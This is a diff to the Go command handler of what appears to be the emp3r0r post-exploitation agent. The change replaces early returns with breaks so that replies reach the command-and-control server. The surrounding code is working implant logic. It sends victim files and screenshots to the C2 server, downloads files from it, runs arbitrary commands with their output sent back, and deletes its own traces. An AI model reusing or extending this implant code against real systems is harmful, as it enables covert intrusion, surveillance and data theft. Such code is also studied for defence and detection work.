@@ -74,20 +74,21 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		out, err = shellPs()
 		if err != nil {
 			out = fmt.Sprintf("Failed to ps: %v", err)
-			return
 		}
+		break
 	case "kill":
 		// Usage: kill --dst <pid>...
 		// Kills the specified processes.
 		out, err = shellKill(cmdSlice[2:]) // skip "kill" and "--dst"
 		if err != nil {
 			out = fmt.Sprintf("Failed to kill: %v", err)
-			return
 		}
+		break
 	case "net_helper":
 		// Usage: net_helper
 		// Displays network information.
 		out = shellNet()
+		break
 	case "get":
 		// Usage: get --file_path <file_path> --offset <offset> --token <token>
 		// Downloads a file from the agent starting at the specified offset.
@@ -99,7 +100,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		log.Printf("Parsed: '%s' %d '%s'", *file_path, *offset, *token)
 		if *file_path == "" || *offset < 0 || *token == "" {
 			out = fmt.Sprintf("args error: %v", cmdSlice)
-			return
+			break
 		}
 		log.Printf("File download: %s at %d with token %s", *file_path, *offset, *token)
 		if util.IsDirExist(*file_path) {
@@ -118,50 +119,53 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			})
 			if err != nil {
 				out = fmt.Sprintf("Error: failed to walk directory %s: %v", *file_path, err)
-				return
+				break
 			}
 			if len(file_list) == 0 {
 				out = fmt.Sprintf("Error: no files found in %s", *file_path)
-				return
+				break
 			}
 			out = strings.Join(file_list, "\n")
-			return
+			break
 		} else {
 			// single file
 			err = sendFile2CC(*file_path, *offset, *token)
 			if err != nil {
 				out = fmt.Sprintf("Error: failed to send file %s: %v", *file_path, err)
-				return
+				break
 			}
 		}
 		out = fmt.Sprintf("Success: %s has been sent, please check", *file_path)
 		if err != nil {
 			log.Printf("get: %v", err)
 			out = *file_path + err.Error()
+			break
 		}
+		break
 	case "screenshot":
 		// Usage: screenshot
 		// Takes a screenshot and sends the file path to CC.
 		if len(cmdSlice) != 1 {
 			out = fmt.Sprintf("args error: %v", cmdSlice)
-			return
+			break
 		}
 		out, err = Screenshot()
 		if err != nil || out == "" {
 			out = fmt.Sprintf("Error: failed to take screenshot: %v", err)
-			return
+			break
 		}
 		// move to agent root
 		err = os.Rename(out, RuntimeConfig.AgentRoot+"/"+out)
 		if err == nil {
 			out = RuntimeConfig.AgentRoot + "/" + out
 		}
+		break
 	case "suicide":
 		// Usage: suicide
 		// Deletes all agent files and exits.
 		if len(cmdSlice) != 1 {
 			out = fmt.Sprintf("args error: %v", cmdSlice)
-			return
+			break
 		}
 		out = fmt.Sprintf("Agent %s is self purging...", RuntimeConfig.AgentTag)
 		err = os.RemoveAll(RuntimeConfig.AgentRoot)
@@ -184,6 +188,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		if err != nil {
 			out = err.Error()
 		}
+		break
 	case "rm":
 		// Usage: rm --dst <path>
 		// Removes the specified file or directory.
@@ -191,12 +196,13 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		flags.Parse(cmdSlice[1:])
 		if *path == "" {
 			out = fmt.Sprintf("args error: %v", cmdSlice)
-			return
+			break
 		}
 		out = "Deleted " + *path
 		if err = os.RemoveAll(*path); err != nil {
 			out = fmt.Sprintf("Failed to delete %s: %v", *path, err)
 		}
+		break
 	case "mkdir":
 		// Usage: mkdir --dst <path>
 		// Creates a directory at the specified path.
@@ -204,12 +210,13 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		flags.Parse(cmdSlice[1:])
 		if *path == "" {
 			out = fmt.Sprintf("args error: %v", cmdSlice)
-			return
+			break
 		}
 		out = "Mkdir " + *path
 		if err = os.MkdirAll(*path, 0o700); err != nil {
 			out = fmt.Sprintf("Failed to mkdir %s: %v", *path, err)
 		}
+		break
 	case "cp":
 		// Usage: cp --src <source> --dst <destination>
 		// Copies a file or directory from source to destination.
@@ -218,12 +225,13 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		flags.Parse(cmdSlice[1:])
 		if *src == "" || *dst == "" {
 			out = fmt.Sprintf("args error: %v", cmdSlice)
-			return
+			break
 		}
 		out = fmt.Sprintf("%s has been copied to %s", *src, *dst)
 		if err = copy.Copy(*src, *dst); err != nil {
 			out = fmt.Sprintf("Failed to copy %s to %s: %v", *src, *dst, err)
 		}
+		break
 	case "mv":
 		// Usage: mv --src <source> --dst <destination>
 		// Moves a file or directory from source to destination.
@@ -232,12 +240,13 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		flags.Parse(cmdSlice[1:])
 		if *src == "" || *dst == "" {
 			out = fmt.Sprintf("args error: %v", cmdSlice)
-			return
+			break
 		}
 		out = fmt.Sprintf("%s has been moved to %s", *src, *dst)
 		if err = os.Rename(*src, *dst); err != nil {
 			out = fmt.Sprintf("Failed to move %s to %s: %v", *src, *dst, err)
 		}
+		break
 	case "cd":
 		// Usage: cd --dst <path>
 		// Changes the current working directory to the specified path.
@@ -245,19 +254,20 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		flags.Parse(cmdSlice[1:])
 		if *path == "" {
 			out = fmt.Sprintf("args error: %v", cmdSlice)
-			return
+			break
 		}
 		if os.Chdir(*path) == nil {
 			out = "changed directory to " + strconv.Quote(*path)
 		} else {
 			out = "cd failed"
 		}
+		break
 	case "pwd":
 		// Usage: pwd
 		// Prints the current working directory.
 		if flags.NArg() != 0 {
 			out = fmt.Sprintf("args error: %v", cmdSlice)
-			return
+			break
 		}
 		pwd, err := os.Getwd()
 		if err != nil {
@@ -265,6 +275,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			pwd = err.Error()
 		}
 		out = "current working directory: " + pwd
+		break
 	case "put":
 		// Usage: put --file <file> --path <destination> --size <size> --checksum <checksum>
 		// Downloads a file from CC to the specified path on the agent.
@@ -276,12 +287,12 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		flags.Parse(cmdSlice[1:])
 		if *file_to_download == "" || *path == "" || *size == 0 {
 			out = fmt.Sprintf("args error: %v", cmdSlice)
-			return
+			break
 		}
 		_, err = SmartDownload(*download_addr, *file_to_download, *path, *orig_checksum)
 		if err != nil {
 			out = fmt.Sprintf("processCCData: cant download %s: %v", *file_to_download, err)
-			return
+			break
 		}
 		// checksum
 		checksum := tun.SHA256SumFile(*path)
@@ -290,6 +301,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		if downloadedSize < *size {
 			out = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nYou can run `put` again to resume uploading", downloadedSize, *size, checksum)
 		}
+		break
 	default:
 		// exec cmd using os/exec normally, sends stdout and stderr back to CC
 		if runtime.GOOS == "windows" {
@@ -330,6 +342,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			out = fmt.Sprintf("%s running in background, PID is %d",
 				cmdSlice, cmd.Process.Pid)
 		}
+		break
 	}
 	defer sendResponse(out)
 }
